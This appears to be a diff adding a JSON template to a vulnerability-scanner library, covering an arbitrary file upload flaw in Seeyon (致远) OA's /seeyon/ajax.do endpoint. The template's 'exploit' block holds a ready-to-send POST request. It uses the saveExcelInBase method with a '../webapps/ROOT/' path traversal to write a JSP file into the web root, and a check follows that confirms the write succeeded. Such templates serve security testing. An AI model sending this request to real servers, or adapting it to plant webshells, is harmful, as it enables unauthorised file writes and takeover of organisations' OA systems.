@@ -1,0 +1,34 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA seeyon/ajax.do 任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "...",
+  "version": "",
+  "note": "访问 http(s)://xx/52e039302a62d077.jsp",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "升级系统"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/seeyon/ajax.do;JSESSIONID=90113E76D97A1601201720C5AB57F7CBE",
+      "data": "managerMethod=saveExcelInBase&managerName=fileToExcelManager&method=ajaxAction&arguments=[\"../webapps/ROOT/52e039302a62d077.jsp\", \"\", {\"columnName\": [\"95cc64dd2825f9df13ec4ad683ecf339\"]}]"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "null"
+        }
+      ]
+    }
+  }
+}
